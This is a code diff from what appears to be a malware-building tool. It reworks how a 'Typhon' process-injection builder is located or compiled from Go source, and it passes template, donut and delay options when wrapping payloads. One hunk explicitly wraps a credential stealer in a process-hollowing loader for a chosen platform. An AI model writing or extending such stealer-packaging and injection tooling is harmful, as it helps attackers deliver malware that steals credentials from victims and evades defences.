@@ -124,70 +124,30 @@ function isPEFile(filePath: string): boolean {
 
 async function checkTyphonAvailable(sendToStream: (data: any) => void): Promise<TyphonInfo | null> {
   const toolsDir = path.join(ensureDataDir(), "tools");
+  const nativeBuilder = path.join(toolsDir, "typhon-builder");
+  const template = path.join(toolsDir, "typhon.exe");
 
-  // Helper: resolve a found binary
-  const resolve = async (binPath: string, label: string): Promise<TyphonInfo | null> => {
-    if (isPEFile(binPath)) {
-      if (process.platform === "linux") {
-        sendToStream({ type: "output", text: `WARNING: ${label} is a Windows PE and cannot run natively on Linux without Wine (which is disabled for image size).\n`, level: "warn" });
-        return null;
-      }
-    }
-    sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
-    return { bin: binPath, useWine: false };
-  };
-
-  // 1. TYPHON_BIN env var
-  const envBin = process.env.TYPHON_BIN?.trim();
-  if (envBin && fs.existsSync(envBin)) {
-    return resolve(envBin, `${envBin} (TYPHON_BIN)`);
+  if (fs.existsSync(nativeBuilder) && fs.existsSync(template)) {
+    sendToStream({ type: "output", text: `Native Typhon builder found: ${nativeBuilder}\n`, level: "info" });
+    return { bin: nativeBuilder, useWine: false };
   }
 
-  // 2. Check system PATH (native binary)
-  try {
-    const which = await $`which typhon`.quiet().nothrow();
-    if (which.exitCode === 0 && which.stdout.toString().trim()) {
-      sendToStream({ type: "output", text: `Typhon found in PATH\n`, level: "info" });
-      return { bin: "typhon", useWine: false };
-    }
-  } catch {}
-
-  // 3. Check data/tools/
-  for (const name of ["typhon.exe", "typhon"]) {
-    const localPath = path.join(toolsDir, name);
-    if (fs.existsSync(localPath)) {
-      return resolve(localPath, localPath);
-    }
-  }
-
-  // 4. On Linux: clone repo and look for a pre-built binary
+  // On Linux, we can build the native builder from source if Go is available
   if (process.platform === "linux") {
-    fs.mkdirSync(toolsDir, { recursive: true });
-    const srcDir = path.join(toolsDir, "typhon-src");
-
-    if (!fs.existsSync(srcDir)) {
-      sendToStream({ type: "output", text: "Cloning messecv3/typhon-process-injection...\n", level: "info" });
-      const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/typhon-process-injection.git ${srcDir}`.quiet().nothrow();
-      if (cloneResult.exitCode !== 0) {
-        const err = (cloneResult.stderr.toString() || cloneResult.stdout.toString()).trim();
-        sendToStream({ type: "output", text: `WARNING: Failed to clone Typhon: ${err}\n`, level: "warn" });
-        return null;
+    const goSrc = path.join(resolveRuntimeRoot(), "src", "server", "typhon-builder.go");
+    if (fs.existsSync(goSrc)) {
+      sendToStream({ type: "output", text: "Building native Typhon builder from Go source...\n", level: "info" });
+      try {
+        fs.mkdirSync(toolsDir, { recursive: true });
+        const buildResult = await $`go build -o ${nativeBuilder} ${goSrc}`.nothrow().quiet();
+        if (buildResult.exitCode === 0 && fs.existsSync(template)) {
+          sendToStream({ type: "output", text: `Native Typhon builder ready: ${nativeBuilder}\n`, level: "info" });
+          return { bin: nativeBuilder, useWine: false };
+        }
+      } catch (err: any) {
+        sendToStream({ type: "output", text: `WARNING: Failed to build native Typhon builder: ${err.message || err}\n`, level: "warn" });
       }
     }
-
-    // Check for a pre-built binary inside the cloned repo
-    for (const name of ["typhon.exe", "typhon"]) {
-      const repoBin = path.join(srcDir, name);
-      if (fs.existsSync(repoBin)) {
-        const localBin = path.join(toolsDir, name);
-        fs.copyFileSync(repoBin, localBin);
-        fs.chmodSync(localBin, 0o755);
-        sendToStream({ type: "output", text: `Typhon binary found in repo\n`, level: "info" });
-        return resolve(localBin, `${localBin} (from repo)`);
-      }
-    }
-
-    sendToStream({ type: "output", text: `WARNING: Typhon repo cloned but no pre-built binary found. Place typhon.exe in ${toolsDir} or install Wine and provide a Windows build.\n`, level: "warn" });
   }
 
   return null;
@@ -1560,13 +1520,19 @@ func runBoundFiles() {
 
           sendToStream({ type: "output", text: `Building Typhon injector for ${platform}...\n`, level: "info" });
 
-          const typhonArgs: string[] = ["-build", typhonInput, "-o", typhonOutputPath];
+          const typhonArgs: string[] = ["-i", typhonInput, "-o", typhonOutputPath];
           if (config.typhonVariant) {
             typhonArgs.push("-variant", config.typhonVariant);
           }
-          if (config.typhonProcess) {
-            typhonArgs.push("-process", config.typhonProcess);
+          if (config.sleepSeconds) {
+            typhonArgs.push("-delay", (config.sleepSeconds * 1000).toString());
           }
+          const donutBin = await checkDonutAvailable(sendToStream);
+          if (donutBin) {
+            typhonArgs.push("-donut", donutBin);
+          }
+          const toolsDir = path.join(ensureDataDir(), "tools");
+          typhonArgs.push("-template", path.join(toolsDir, "typhon.exe"));
 
           try {
             const typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
@@ -1949,9 +1915,14 @@ func runBoundFiles() {
           const stealerTyphonPath = `${outDir}/${stealerTyphonName}`;
           sendToStream({ type: "output", text: `Wrapping stealer in Typhon process-hollowing loader...\n`, level: "info" });
 
-          const typhonArgs: string[] = ["-build", typhonInput, "-o", stealerTyphonPath];
+          const typhonArgs: string[] = ["-i", typhonInput, "-o", stealerTyphonPath];
           if (config.typhonVariant) typhonArgs.push("-variant", config.typhonVariant);
-          if (config.typhonProcess) typhonArgs.push("-process", config.typhonProcess);
+          const donutBin = await checkDonutAvailable(sendToStream);
+          if (donutBin) {
+            typhonArgs.push("-donut", donutBin);
+          }
+          const toolsDir = path.join(ensureDataDir(), "tools");
+          typhonArgs.push("-template", path.join(toolsDir, "typhon.exe"));
 
           try {
             const typhonResult = await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
